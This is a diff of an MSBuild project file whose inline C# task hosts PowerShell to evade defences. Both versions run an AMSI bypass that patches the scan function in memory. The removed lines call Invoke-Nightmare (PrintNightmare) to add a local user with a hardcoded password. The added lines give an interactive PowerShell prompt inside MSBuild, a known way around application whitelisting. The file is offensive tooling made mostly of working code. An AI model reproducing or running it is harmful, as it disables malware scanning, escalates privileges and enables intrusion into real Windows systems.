@@ -24,8 +24,9 @@
         <![CDATA[
         using System;
         using System.IO;
-        using System.Diagnostics;
-        using System.Threading;
+        using System.Collections.ObjectModel;
+        using System.Management.Automation;
+        using System.Management.Automation.Runspaces;
         using Microsoft.Build.Framework;
         using Microsoft.Build.Utilities;
 
@@ -33,23 +34,15 @@
         {
             public override bool Execute()
             {
-                // Start a separate thread for PowerShell execution to avoid blocking MSBuild
-                Thread powerShellThread = new Thread(RunPowerShell);
-                powerShellThread.Start();
-                
-                // Optionally, wait for the thread to finish, if needed
-                // powerShellThread.Join();
-                return true;
-            }
-
-            private void RunPowerShell()
-            {
+                Runspace rs = RunspaceFactory.CreateRunspace();
+                rs.Open();
+                PowerShell ps = PowerShell.Create();
+                ps.Runspace = rs;
                 string currentDirectory = Directory.GetCurrentDirectory();
                 
-                // Full path to PowerShell executable
-                string powerShellPath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
-                
-                // AMSI bypass script (adjust as needed)
+                Console.WriteLine("PS " + currentDirectory + ">");
+
+                // AMSI bypass code
                 string amsiBypass = @"
                 $a=[Ref].Assembly.GetTypes(); 
                 Foreach($b in $a) {
@@ -69,48 +62,86 @@
                 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);
                 ";
 
-                // Command to execute via PowerShell
-                string script = $@"
-                    {amsiBypass}
-                    Invoke-Nightmare -DriverName ""Xerox"" -NewUser ""amit2"" -NewPassword ""Password123!""
-                ";
+                // Add the AMSI bypass script to the session
+                ps.AddScript(amsiBypass);
+                ps.Invoke();
 
-                // Set up ProcessStartInfo to run the PowerShell script
-                ProcessStartInfo startInfo = new ProcessStartInfo
+                while (true)
                 {
-                    FileName = powerShellPath,
-                    Arguments = $"-NoExit -Command \"{script}\"",
-                    RedirectStandardOutput = true,
-                    RedirectStandardError = true,
-                    RedirectStandardInput = true, // Ensure input can be passed in case of interactivity
-                    UseShellExecute = false, // Must be false for redirection to work
-                    CreateNoWindow = true
-                };
+                    // Print the prompt first
+                    Console.Write("PS " + currentDirectory + "> ");
+                    string cmd = Console.ReadLine();
+                    if (string.IsNullOrWhiteSpace(cmd)) continue;
 
-                Process process = new Process();
-                process.StartInfo = startInfo;
-
-                // Capture output and error
-                process.OutputDataReceived += (sender, e) => {
-                    if (!string.IsNullOrWhiteSpace(e.Data))
+                    try
                     {
-                        Console.Write(e.Data); // Avoid extra line breaks
+                        // Handle 'exit' command separately
+                        if (cmd.Trim().ToLower() == "exit")
+                        {
+                            Console.WriteLine("Exiting PowerShell session...");
+                            break;  // Breaks the loop and ends the session
+                        }
+
+                        // Handle directory navigation commands
+                        if (cmd.StartsWith("cd ") || cmd.StartsWith("Set-Location"))
+                        {
+                            string targetPath = cmd.Substring(cmd.IndexOf(" ") + 1).Trim().Replace("\"", "");
+                            if (Directory.Exists(targetPath))
+                            {
+                                Directory.SetCurrentDirectory(targetPath);
+                                currentDirectory = Directory.GetCurrentDirectory();
+                                ps.AddScript(string.Format("Set-Location \"{0}\"", currentDirectory)).Invoke();
+                            }
+                            else
+                            {
+                                Console.WriteLine("The system cannot find the path specified: " + targetPath);
+                            }
+                            continue;
+                        }
+
+                        // Add the Out-String cmdlet to ensure proper formatting for other commands
+                        ps.AddScript(cmd + " | Out-String");
+                        Collection<PSObject> psOutput = ps.Invoke();
+                        Collection<ErrorRecord> errors = ps.Streams.Error.ReadAll();
+
+                        if (errors.Count > 0)
+                        {
+                            // Print a blank line before the error message and next prompt
+                            Console.WriteLine(); // Blank line before error output
+                            foreach (ErrorRecord error in errors)
+                            {
+                                Console.WriteLine(error.ToString());
+                            }
+                        }
+                        else
+                        {
+                            foreach (PSObject output in psOutput)
+                            {
+                                if (output != null)
+                                {
+                                    // Print a blank line before the command output
+                                    Console.WriteLine(); // Blank line before output
+                                    Console.WriteLine(output.ToString());
+                                }
+                            }
+                        }
                     }
-                };
-                process.ErrorDataReceived += (sender, e) => {
-                    if (!string.IsNullOrWhiteSpace(e.Data))
+                    catch (Exception e)
                     {
-                        Console.Write("ERROR: " + e.Data); // Avoid extra line breaks
+                        // Print a blank line before the error message and next prompt
+                        Console.WriteLine(); // Blank line before error output
+                        Console.WriteLine("**** ERROR ****");
+                        Console.WriteLine(e.Message);
                     }
-                };
+                    finally
+                    {
+                        ps.Commands.Clear();
+                        Console.WriteLine();
+                    }
+                }
 
-                // Capturing verbose and progress output as well
-                process.Start();
-                process.BeginOutputReadLine();
-                process.BeginErrorReadLine();
-
-                // Wait for the process to exit
-                process.WaitForExit();
+                rs.Close();
+                return true;
             }
         }
         ]]>
